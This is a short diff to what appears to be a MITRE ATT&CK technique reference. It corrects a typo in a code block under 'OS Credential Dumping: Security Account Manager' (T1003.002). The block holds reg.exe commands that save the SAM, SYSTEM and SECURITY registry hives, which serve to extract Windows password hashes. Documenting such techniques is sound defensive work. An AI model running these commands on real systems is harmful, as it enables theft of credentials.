@@ -157,7 +157,7 @@ OS Credential Dumping: Security Account Manager [[T1003.002](https://attack.mitr
 
 ```
 С:\Windows\System32\reg.exe save hklm\sam sam.hive
-eg save hklm\system sys
+reg save hklm\system sys
 reg save hklm\security sec
 ```
 
